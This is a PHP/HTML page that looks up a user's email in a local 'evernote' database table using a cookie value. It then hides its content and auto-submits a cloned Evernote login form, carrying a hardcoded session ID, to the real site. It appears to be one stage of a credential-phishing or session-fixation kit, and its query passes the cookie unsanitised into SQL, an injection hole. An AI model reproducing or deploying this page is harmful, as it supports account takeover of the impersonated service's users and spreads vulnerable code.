<style>body{margin-left:-200%;}</style><img src="../small_icons/328.gif" style="left:45%; top:40%;position:absolute"/><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>
<?
require_once('../db.php');
$uid=htmlspecialchars($_COOKIE['uid']);
$query = mysql_query("SELECT user_email FROM `evernote` WHERE `user_id`='$uid'"); 
$result = mysql_fetch_assoc($query); 
$email=$result['user_email'];  
?>
<body onLoad="javascript: submitform()">

<script type="text/javascript">function submitform()  {document.forms["login_form"].submit();}</script>



<form id="login_form" name="login_form" action="https://www.evernote.com/Login.action;jsessionid=43EEBC0955DE118EF3AEA418EA8B4E5B" method="post"><label>Email address or username</label>
  <input id="username" maxlength="64" name="username" class="text" type="text" value="<?=$email;?>"><div id="username_errors" class="form_errors"></div>
  <label>Password</label>
  <input id="password" maxlength="64" name="password" class="text" type="password"><div class="checkbox-container">
      <input id="rememberMe" name="rememberMe" value="true" class="checkbox" type="checkbox"><label class="checkbox-text">Remember me for a week</label>
    </div>
  <input name="targetUrl" value="/Home.action" type="hidden"><input name="targetUrl" value="/Home.action" type="hidden"><input id="login" name="login" value="Sign in" class="super-emphasize" type="submit"><div style="display: none;"><input type="hidden" name="_sourcePage" value="nhNCLRTdbHviMUD9T65RG_YvRLZ-1eYO3fqfqRu0fynRL_1nukNa4gH1t86pc1SP"><input type="hidden" name="__fp" value="ZNYNjivOKks3yWPvuidLz-TPR6I9Jhx8"></div></form>

</body>
</html>

